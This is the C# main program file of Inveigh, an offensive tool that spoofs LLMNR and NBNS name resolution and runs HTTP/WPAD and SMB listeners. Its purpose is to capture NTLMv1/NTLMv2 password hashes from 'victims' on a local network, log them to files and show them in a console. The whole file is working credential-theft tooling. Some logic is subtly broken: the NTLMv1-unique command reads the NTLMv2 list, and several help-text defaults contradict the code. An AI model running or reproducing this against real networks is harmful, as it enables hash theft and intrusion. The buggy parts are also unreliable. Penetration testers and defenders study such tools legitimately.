using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;
using System.Collections;
using System.Diagnostics;
using System.Security.Principal;

namespace Inveigh
{

    class Program
    {
        public static Hashtable smbSessionTable = Hashtable.Synchronized(new Hashtable());
        public static Hashtable httpSessionTable = Hashtable.Synchronized(new Hashtable());
        public static IList<string> outputList = new List<string>();
        static IList<string> consoleList = new List<string>();
        static IList<string> logList = new List<string>();
        static IList<string> logFileList = new List<string>();
        public static IList<string> ntlmv1List = new List<string>();
        public static IList<string> ntlmv2List = new List<string>();
        public static IList<string> ntlmv1FileList = new List<string>();
        public static IList<string> ntlmv2FileList = new List<string>();
        public static IList<string> ntlmv1UsernameList = new List<string>();
        public static IList<string> ntlmv2UsernameList = new List<string>();
        public static IList<string> ipCaptureList = new List<string>();
        public static bool consoleOutput = true;
        public static bool exitInveigh = false;
        public static string[] parameterSpooferHostsIgnore;
        public static string[] parameterSpooferHostsReply;
        public static string[] parameterSpooferIPsIgnore;
        public static string[] parameterSpooferIPsReply;

        static void Main(string[] args)
        {
            //parameters
            string parameterChallenge = "";
            string parameterElevatedPrivilege = "Auto";
            string parameterFileOutput = "Y";
            string parameterFileOutputDirectory = "";
            string parameterFileUnique = "N";
            string parameterHelp = "";
            string parameterHTTP = "Y";
            string parameterIP = "";
            string parameterLLMNR = "Y";
            string parameterMachineAccounts = "N";
            string parameterNBNS = "Y";
            string[] parameterNBNSTypes = { "00", "20" };
            string parameterSMB = "Y";
            string parameterSpooferIP = "";
            string parameterSpooferRepeat = "Y";
            string parameterRunCount = "0";
            string parameterRunTime = "0";
            string parameterWPADAuth = "NTLM";

            string computerName = System.Environment.MachineName;
            string netbiosDomain = System.Environment.UserDomainName;
            string dnsDomain = "";

            try
            {
                dnsDomain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
            }
            catch
            {
                dnsDomain = netbiosDomain;
            }

            if (args.Length > 0)
            {
                foreach (var entry in args.Select((value, index) => new { index, value }))
                {
                    string parameter = entry.value.ToUpper();

                    switch (parameter)
                    {
                        case "-CHALLENGE":
                        case "/CHALLENGE":
                            parameterChallenge = args[entry.index + 1].ToUpper();
                            break;

                        case "-ELEVATEDPRIVILEGE":
                        case "/ELEVATEDPRIVILEGE":
                            parameterElevatedPrivilege = args[entry.index + 1].ToUpper();
                            break;

                        case "-FILEOUTPUT":
                        case "/FILEOUTPUT":
                            parameterFileOutput = args[entry.index + 1].ToUpper();
                            break;

                        case "-FILEOUTPUTDIRECTORY":
                        case "/FILEOUTPUTDIRECTORY":
                            parameterFileOutputDirectory = args[entry.index + 1].ToUpper();
                            break;

                        case "-FILEUNIQUE":
                        case "/FILEUNIQUE":
                            parameterFileUnique = args[entry.index + 1].ToUpper();
                            break;

                        case "-HTTP":
                        case "/HTTP":
                            parameterHTTP = args[entry.index + 1].ToUpper();
                            break;

                        case "-IP":
                        case "/IP":
                            parameterIP = args[entry.index + 1].ToUpper();
                            break;

                        case "-LLMNR":
                        case "/LLMNR":
                            parameterLLMNR = args[entry.index + 1].ToUpper();
                            break;

                        case "-MACHINEACCOUNTS":
                        case "/MACHINEACCOUNTS":
                            parameterMachineAccounts = args[entry.index + 1].ToUpper();
                            break;

                        case "-NBNS":
                        case "/NBNS":
                            parameterNBNS = args[entry.index + 1].ToUpper();
                            break;

                        case "-NBNSTYPES":
                        case "/NBNSTYPES":
                            parameterNBNSTypes = args[entry.index + 1].ToUpper().Split(',');
                            break;

                        case "-RUNCOUNT":
                        case "/RUNCOUNT":
                            parameterRunCount = args[entry.index + 1].ToUpper();
                            break;

                        case "-RUNTIME":
                        case "/RUNTIME":
                            parameterRunTime = args[entry.index + 1].ToUpper();
                            break;

                        case "-SMB":
                        case "/SMB":
                            parameterSMB = args[entry.index + 1].ToUpper();
                            break;

                        case "-SPOOFERHOSTSIGNORE":
                        case "/SPOOFERHOSTSIGNORE":
                            parameterSpooferHostsIgnore = args[entry.index + 1].ToUpper().Split(',');
                            break;

                        case "-SPOOFERHOSTSREPLY":
                        case "/SPOOFERHOSTSREPLY":
                            parameterSpooferHostsReply = args[entry.index + 1].ToUpper().Split(',');
                            break;

                        case "-SPOOFERIP":
                        case "/SPOOFERIP":
                            parameterSpooferIP = args[entry.index + 1];
                            break;

                        case "-SPOOFERIPSIGNORE":
                        case "/SPOOFERIPSIGNORE":
                            parameterSpooferIPsIgnore = args[entry.index + 1].ToUpper().Split(',');
                            break;

                        case "-SPOOFERIPSREPLY":
                        case "/SPOOFERIPSREPLY":
                            parameterSpooferIPsReply = args[entry.index + 1].ToUpper().Split(',');
                            break;

                        case "-SPOOFERREPEAT":
                        case "/SPOOFERREPEAT":
                            parameterSpooferRepeat = args[entry.index + 1].ToUpper();
                            break;

                        case "-WPADAUTH":
                        case "/WPADAUTH":
                            parameterWPADAuth = args[entry.index + 1].ToUpper();
                            break;

                        case "-?":
                        case "/?":
                            if (args.Length > 1)
                                parameterHelp = args[entry.index + 1].ToUpper();
                            GetHelp(parameterHelp);
                            Environment.Exit(0);
                            break;

                        default:
                            if (parameter.StartsWith("-") || parameter.StartsWith("/"))
                                throw new ArgumentException(paramName: parameter, message: "Invalid parameter");
                            break;
                    }

                }
            }

            int runCount = 0;
            int runTime = 0;

            if (parameterHTTP != "Y" && parameterHTTP != "N") throw new ArgumentException("HTTP value must be Y or N");
            if (parameterLLMNR != "Y" && parameterLLMNR != "N") throw new ArgumentException("LLMNR value must be Y or N");
            if (parameterMachineAccounts != "Y" && parameterMachineAccounts != "N") throw new ArgumentException("MachineAccounts value must be Y or N");
            if (parameterNBNS != "Y" && parameterNBNS != "N") throw new ArgumentException("NBNS value must be Y or N");
            if (parameterSMB != "Y" && parameterSMB != "N") throw new ArgumentException("SMB value must be Y or N");
            try { runCount = Int32.Parse(parameterRunCount); } catch { throw new ArgumentException("RunCount value must be a integer"); }
            try { runTime = Int32.Parse(parameterRunTime); } catch { throw new ArgumentException("RunTime value must be a integer"); }
            if (parameterWPADAuth != "NTLM" && parameterWPADAuth != "NTLMNOESS" && parameterWPADAuth != "ANONYMOUS") throw new ArgumentException("WPADAuth value must be Anonymous, NTLM, or NTLMNoESS");

            bool enabledFileOutput = false;
            bool enabledHTTP = false;
            bool enabledNBNS = false;
            bool enabledLLMNR = false;
            bool enabledMachineAccounts = false;
            bool enabledSMB = false;
            bool enabledSpooferRepeat = false;

            if (String.Equals(parameterFileOutput, "Y")) { enabledFileOutput = true; }
            if (String.Equals(parameterHTTP, "Y")) { enabledHTTP = true; }
            if (String.Equals(parameterLLMNR, "Y")) { enabledLLMNR = true; }
            if (String.Equals(parameterMachineAccounts, "Y")) { enabledMachineAccounts = true; }
            if (String.Equals(parameterNBNS, "Y")) { enabledNBNS = true; }
            if (String.Equals(parameterSMB, "Y")) { enabledSMB = true; }
            if (String.Equals(parameterSpooferRepeat, "Y")) { enabledSpooferRepeat = true; }

            if (string.IsNullOrEmpty(parameterIP))
            {
                using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
                {
                    socket.Connect("203.0.113.1", 65530); // need better way
                    IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                    parameterIP = endPoint.Address.ToString();
                }

            }

            if (string.IsNullOrEmpty(parameterSpooferIP))
            {
                parameterSpooferIP = parameterIP;
            }

            bool isElevated;

            if (String.Equals(parameterElevatedPrivilege, "Auto"))
            {

                using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
                {
                    WindowsPrincipal principal = new WindowsPrincipal(identity);
                    isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
                }

            }
            else if (String.Equals(parameterElevatedPrivilege, "Y"))
            {
                isElevated = true;
            }
            else
            {
                isElevated = false;
            }

            string optionStatus = "";
            outputList.Add(String.Format("[*] Inveigh started at {0}", DateTime.Now.ToString("s")));
            if (isElevated) optionStatus = "Enabled";
            else optionStatus = "Disabled";
            outputList.Add(String.Format("[+] Elevated Privilege Mode = {0}", optionStatus));
            outputList.Add(String.Format("[+] Primary IP Address = {0}", parameterIP));
            outputList.Add(String.Format("[+] Spoofer IP Address = {0}", parameterSpooferIP));
            if (parameterSpooferHostsIgnore != null) outputList.Add(String.Format("[+] Spoofer Hosts Ignore = {0}", string.Join(",", parameterSpooferHostsIgnore)));
            if (parameterSpooferHostsReply != null) outputList.Add(String.Format("[+] Spoofer Hosts Reply = {0}", string.Join(",", parameterSpooferHostsReply)));
            if (parameterSpooferIPsIgnore != null) outputList.Add(String.Format("[+] Spoofer IPs Ignore = {0}", string.Join(",", parameterSpooferIPsIgnore)));
            if (parameterSpooferIPsReply != null) outputList.Add(String.Format("[+] Spoofer IPs Reply = {0}", string.Join(",", parameterSpooferIPsReply)));
            if (enabledLLMNR) optionStatus = "Enabled";
            else optionStatus = "Disabled";
            outputList.Add(String.Format("[+] LLMNR Spoofer = {0}", optionStatus));
            if (enabledNBNS) outputList.Add(String.Format("[+] NBNS Spoofer For Types {0} = Enabled", string.Join(",", parameterNBNSTypes)));
            else outputList.Add(String.Format("[+] NBNS Spoofer = Disabled"));
            if (enabledHTTP) optionStatus = "Enabled";
            else optionStatus = "Disabled";
            outputList.Add(String.Format("[+] HTTP Capture = {0}", optionStatus));
            outputList.Add(String.Format("[+] WPAD Authentication = {0}", parameterWPADAuth));
            if (enabledSMB && isElevated) optionStatus = "Enabled";
            else optionStatus = "Disabled";
            outputList.Add(String.Format("[+] SMB Capture = {0}", optionStatus));
            if (enabledMachineAccounts) optionStatus = "Enabled";
            else optionStatus = "Disabled";
            outputList.Add(String.Format("[+] Machine Account Capture = {0}", optionStatus));
            if (runCount == 1) outputList.Add(String.Format("[+] Run Count = {0} Minute", runCount));
            else if(runCount > 1) outputList.Add(String.Format("[+] Run Count = {0} Minutes", runCount));
            if (runTime == 1) outputList.Add(String.Format("[+] Run Time = {0} Minute", runTime));
            else if (runTime > 1) outputList.Add(String.Format("[+] Run Time = {0} Minutes", runTime));
            outputList.Add(String.Format("[*] Press ESC to access console"));

            if (isElevated && (enabledLLMNR || enabledNBNS || enabledSMB))
            {
                Thread snifferSpooferThread = new Thread(() => Sniffer.SnifferSpoofer(parameterIP, parameterSpooferIP, enabledLLMNR, enabledNBNS, parameterNBNSTypes, enabledSMB, enabledFileOutput, enabledSpooferRepeat, enabledMachineAccounts));
                snifferSpooferThread.Start();
            }
            else
            {
                Thread nbnsListenerThread = new Thread(() => NBNS.NBNSListener(parameterIP, parameterSpooferIP, enabledNBNS, parameterNBNSTypes, enabledFileOutput));
                nbnsListenerThread.Start();
            }

            Thread httpListenerThread = new Thread(() => HTTP.HTTPListener(parameterChallenge, computerName, dnsDomain, netbiosDomain, parameterWPADAuth, enabledFileOutput, enabledSpooferRepeat, parameterIP, enabledMachineAccounts));
            httpListenerThread.Start();
            Thread controlThread = new Thread(() => ControlLoop(runCount, runTime));
            controlThread.Start();

            if (enabledFileOutput)
            {
                Thread fileOutputThread = new Thread(() => FileOutput());
                fileOutputThread.Start();
            }

            

            while (true)
            {

                OutputLoop();

                consoleOutput = false;
                int x = Console.CursorLeft;
                int y = Console.CursorTop;
                Console.CursorTop = Console.WindowTop + Console.WindowHeight - 1;
                Console.Write("Inveigh>");
                string inputCommand = Console.ReadLine();
                Console.CursorTop = Console.WindowTop + Console.WindowHeight - 2;
                Console.Write(new string(' ', Console.WindowWidth));
                Console.SetCursorPosition(x, y);
                inputCommand = inputCommand.ToUpper();

                switch (inputCommand)
                {

                    case "GET CONSOLE":
                        Console.Clear();
                        {

                            if (outputList.Count > 0)
                            {

                                if (outputList[0].Contains("[*]"))
                                {
                                    Console.ForegroundColor = ConsoleColor.Green;
                                    Console.WriteLine(outputList[0]);
                                    Console.ResetColor();
                                }
                                else
                                {
                                    Console.WriteLine(outputList[0]);
                                }

                                outputList.RemoveAt(0);

                            }

                        }
                        break;
                    case "GET LOG":
                        Console.Clear();
                        string[] outputLog = logList.ToArray();
                        foreach (string entry in outputLog)
                        {
                            if (entry.Contains("[*]"))
                            {
                                Console.ForegroundColor = ConsoleColor.Green;
                                Console.WriteLine(entry);
                                Console.ResetColor();
                            }
                            else
                            {
                                Console.WriteLine(entry);
                            }

                        }
                        break;

                    case "GET NTLMV1":
                        Console.Clear();
                        string[] outputNTLMV1 = ntlmv1List.ToArray();
                        foreach (string entry in outputNTLMV1)
                            Console.WriteLine(entry);
                        break;

                    case "GET NTLMV1UNIQUE":
                        Console.Clear();
                        string uniqueNTLMv1Account = "";
                        string uniqueNTLMv1AccountLast = "";
                        string[] outputNTLMV1Unique = ntlmv2List.ToArray();
                        Array.Sort(outputNTLMV1Unique);

                        foreach (string entry in outputNTLMV1Unique)
                        {
                            uniqueNTLMv1Account = entry.Substring(0, entry.IndexOf(":", (entry.IndexOf(":") + 2)));

                            if (!String.Equals(uniqueNTLMv1Account, uniqueNTLMv1AccountLast))
                            {
                                Console.WriteLine(entry);
                            }

                            uniqueNTLMv1AccountLast = uniqueNTLMv1Account;
                        }
                        break;

                    case "GET NTLMV2":
                        Console.Clear();
                        string[] outputNTLMV2 = ntlmv2List.ToArray();
                        foreach (string entry in outputNTLMV2)
                            Console.WriteLine(entry);
                        break;

                    case "GET NTLMV2UNIQUE":
                        Console.Clear();
                        string uniqueNTLMv2Account = "";
                        string uniqueNTLMv2AccountLast = "";
                        string[] outputNTLMV2Unique = ntlmv2List.ToArray();
                        Array.Sort(outputNTLMV2Unique);

                        foreach (string entry in outputNTLMV2Unique)
                        {
                            uniqueNTLMv2Account = entry.Substring(0, entry.IndexOf(":", (entry.IndexOf(":") + 2)));

                            if (!String.Equals(uniqueNTLMv2Account, uniqueNTLMv2AccountLast))
                            {
                                Console.WriteLine(entry);
                            }

                            uniqueNTLMv2AccountLast = uniqueNTLMv2Account;
                        }
                        break;

                    case "?":
                    case "HELP":
                        Console.Clear();
                        Console.WriteLine("GET CONSOLE = get queued console output");
                        Console.WriteLine("GET LOG = get Inveigh log");
                        Console.WriteLine("GET NTLMV1 = get captured NTLMv1 challenge/response hashes");
                        Console.WriteLine("GET NTLMV2 = get captured NTLMv2 challenge/response hashes");
                        Console.WriteLine("RESUME = resume real time console output");
                        Console.WriteLine("STOP = stop Inveigh");
                        break;

                    case "RESUME":
                        consoleOutput = true;
                        break;

                    case "STOP":
                        Console.WriteLine(String.Format("[+] Inveigh exited at {0}", DateTime.Now.ToString("s")));
                        Environment.Exit(0);
                        break;

                    default:
                        Console.WriteLine("Invalid Command");
                        break;
                }

                System.Threading.Thread.Sleep(5);
            }

        }

        static void FileOutput()
        {
            string currentDirectory = System.IO.Directory.GetCurrentDirectory();

            while (true)
            {

                if (logFileList.Count > 0)
                {

                    using (StreamWriter outputFileLog = new StreamWriter(Path.Combine(currentDirectory, "Inveigh-Log.txt"), true))
                    {
                        outputFileLog.WriteLine(logFileList[0]);
                        outputFileLog.Close();
                        logFileList.RemoveAt(0);
                    }

                }

                if (ntlmv1FileList.Count > 0)
                {

                    using (StreamWriter outputFileNTLMv1 = new StreamWriter(Path.Combine(currentDirectory, "Inveigh-NTLMv1.txt"), true))
                    {
                        outputFileNTLMv1.WriteLine(ntlmv1FileList[0]);
                        outputFileNTLMv1.Close();
                        ntlmv1FileList.RemoveAt(0);
                    }


                }

                if (ntlmv2FileList.Count > 0)
                {

                    using (StreamWriter outputFileNTLMv2 = new StreamWriter(Path.Combine(currentDirectory, "Inveigh-NTLMv2.txt"), true))
                    {
                        outputFileNTLMv2.WriteLine(ntlmv2FileList[0]);
                        outputFileNTLMv2.Close();
                        ntlmv2FileList.RemoveAt(0);
                    }

                }

                System.Threading.Thread.Sleep(100);
            }

        }

        static void OutputLoop()
        {

            do
            {
                while (consoleOutput && !Console.KeyAvailable)
                {

                    if (consoleList.Count > 0)
                    {

                        if (consoleList[0].StartsWith("[*]"))
                        {
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine(consoleList[0]);
                            Console.ResetColor();
                        }
                        else if (consoleList[0].StartsWith("[!]"))
                        {
                            Console.ForegroundColor = ConsoleColor.Yellow;
                            Console.WriteLine(consoleList[0]);
                            Console.ResetColor();
                        }
                        else
                        {
                            Console.WriteLine(consoleList[0]);
                        }

                        consoleList.RemoveAt(0);
                    }

                }
            } while (Console.ReadKey(true).Key != ConsoleKey.Escape);

        }

        static void ControlLoop(int runCount, int runTime)
        {
            var stopwatchRunTime = new Stopwatch();
            stopwatchRunTime.Start();

            while (true)
            {

                if (runTime > 0 && consoleOutput && stopwatchRunTime.Elapsed.Minutes >= runTime)
                {
                    outputList.Add(String.Format("[*] {0} Inveigh is exiting due to reaching run time", DateTime.Now.ToString("s")));
                    exitInveigh = true;
                }

                if (runCount > 0 && consoleOutput && (ntlmv1List.Count >= runCount || ntlmv2List.Count >= runCount))
                {
                    outputList.Add(String.Format("[*] {0} Inveigh is exiting due to reaching run count", DateTime.Now.ToString("s")));
                    exitInveigh = true;
                }

                while (outputList.Count > 0)
                {
                    consoleList.Add(outputList[0]);
                    logList.Add(outputList[0]);
                    logFileList.Add(outputList[0]);

                    lock (outputList)
                    {
                        outputList.RemoveAt(0);
                    }

                }

                if (exitInveigh && consoleOutput)
                {
                    while (consoleList.Count > 0)
                    {
                        System.Threading.Thread.Sleep(5);
                    }

                    Environment.Exit(0);
                }

                System.Threading.Thread.Sleep(5);
            }

        }

        static void GetHelp(string parameter)
        {
            bool nullParameter = true;

            Console.WriteLine("");

            if (String.IsNullOrEmpty(parameter))
            {
                Console.WriteLine("Parameters:\n");
            }
            else
            {
                Console.WriteLine("Parameter:\n");
                nullParameter = false;
            }

            if (nullParameter || String.Equals(parameter, "CHALLENGE"))
            {
                Console.WriteLine(" -Challenge               Default = Random: 16 character hex NTLM challenge for use with the HTTP listener.");
                Console.WriteLine("                          If left blank, a random challenge will be generated for each request.");
            }

            if (nullParameter || String.Equals(parameter, "ELEVATEDPRIVILEGE"))
            {
                Console.WriteLine(" -ElevatedPrivilege       Default = Auto: (Auto/Y/N) Set the privilege mode. Auto will determine if Inveigh");
                Console.WriteLine("                          is running with elevated privilege.If so, options that require elevated privilege");
                Console.WriteLine("                          can be used.");
            }

            if (nullParameter || String.Equals(parameter, "FILEOUTPUT"))
            {
                Console.WriteLine(" -FileOutput              Default = Disabled: (Y/N) Enable/Disable real time file output.");
            }

            if (nullParameter || String.Equals(parameter, "FILEOUTPUTDIRECTORY"))
            {
                Console.WriteLine(" -FileOutputDirectory     Default = Working Directory: Valid path to an output directory for log and capture");
                Console.WriteLine("                          files. FileOutput must also be enabled.");
            }

            if (nullParameter || String.Equals(parameter, "FILEUNIQUE"))
            {
                Console.WriteLine(" -FileUnique              Default = Enabled: (Y/N) Enable/Disable outputting challenge/response hashes for");
                Console.WriteLine("                          only unique IP, domain/hostname, and username combinations when real time file");
                Console.WriteLine("                          output is enabled.");
            }

            if (nullParameter || String.Equals(parameter, "HTTP"))
            {
                Console.WriteLine(" -HTTP                    Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.");
            }

            if (nullParameter || String.Equals(parameter, "IP"))
            {
                Console.WriteLine(" -IP                      Local IP address for listening and packet sniffing. This IP address will also be");
                Console.WriteLine("                          used for LLMNR/NBNS spoofing if the SpooferIP parameter is not set.");
            }

            if (nullParameter || String.Equals(parameter, "LLMNR"))
            {
                Console.WriteLine(" -LLMNR                   Default = Enabled: (Y/N) Enable/Disable LLMNR spoofing.");
            }

            if (nullParameter || String.Equals(parameter, "NBNS"))
            {
                Console.WriteLine(" -NBNS                    Default = Disabled: (Y/N) Enable/Disable NBNS spoofing.");
            }

            if (nullParameter || String.Equals(parameter, "NBNSTYPES"))
            {
                Console.WriteLine(" -NBNSTypes               Default = Disabled: (Y/N) Enable/Disable NBNS brute force spoofer.");
            }

            if (nullParameter || String.Equals(parameter, "RUNCOUNT"))
            {
                Console.WriteLine(" -RunCount                Default = Unlimited: (Integer) Number of NTLMv1/NTLMv2 captures to perform before");
                Console.WriteLine("                          auto-exiting.");
            }

            if (nullParameter || String.Equals(parameter, "RUNTIME"))
            {
                Console.WriteLine(" -RunTime                 (Integer) Run time duration in minutes.");
            }

            if (nullParameter || String.Equals(parameter, "SMB"))
            {
                Console.WriteLine(" -SMB                     Default = Enabled: (Y/N) Enable/Disable SMB challenge/response capture. Warning,");
                Console.WriteLine("                          LLMNR/NBNS spoofing can still direct targets to the host system's SMB server.");
                Console.WriteLine("                          Block TCP ports 445/139 or kill the SMB services if you need to prevent login");
                Console.WriteLine("                          equests from being processed by the Inveigh host.");
            }

            if (nullParameter || String.Equals(parameter, "SPOOFERHOSTSIGNORE"))
            {
                Console.WriteLine(" -SpooferHostsIgnore      Default = All: Comma separated list of requested hostnames to ignore when spoofing");
                Console.WriteLine("                          with LLMNR/NBNS.");
            }

            if (nullParameter || String.Equals(parameter, "SPOOFERHOSTSREPLY"))
            {
                Console.WriteLine(" -SpooferHostsReply       Default = All: Comma separated list of requested hostnames to respond to when spoofing");
                Console.WriteLine("                          with LLMNR/NBNS.");
            }

            if (nullParameter || String.Equals(parameter, "SPOOFERIP"))
            {
                Console.WriteLine(" -SpooferIP               IP address for LLMNR/NBNS spoofing. This parameter is only necessary when");
                Console.WriteLine("                          redirecting victims to a system other than the Inveigh host.");
            }

            if (nullParameter || String.Equals(parameter, "SPOOFERIPSIGNORE"))
            {
                Console.WriteLine(" -SpooferIPsIgnore        Default = All: Comma separated list of source IP addresses to ignore when spoofing with");
                Console.WriteLine("                          LLMNR/NBNS.");
            }

            if (nullParameter || String.Equals(parameter, "SPOOFERIPSREPLY"))
            {
                Console.WriteLine(" -SpooferIPsReply         Default = All: Comma separated list of source IP addresses to respond to when spoofing");
                Console.WriteLine("                          with LLMNR/NBNS.");
            }

            if (nullParameter || String.Equals(parameter, "SPOOFERREPEAT"))
            {
                Console.WriteLine(" -SpooferRepeat           Default = Enabled: (Y/N) Enable/Disable repeated LLMNR/ NBNS spoofs to a victim system");
                Console.WriteLine("                          after one user challenge/response has been captured.");
            }

            if (nullParameter || String.Equals(parameter, "WPADAUTH"))
            {
                Console.WriteLine(" -WPADAuth                Default = NTLM: (Anonymous/Basic/NTLM/NTLMNoESS) HTTP/HTTPS listener authentication type");
                Console.WriteLine("                          for wpad.dat requests. Setting to Anonymous can prevent browser login prompts. NTLMNoESS ");
                Console.WriteLine("                          turns off the 'Extended Session Security' flag during negotiation.");
            }

            Console.WriteLine();
        }

    }

}

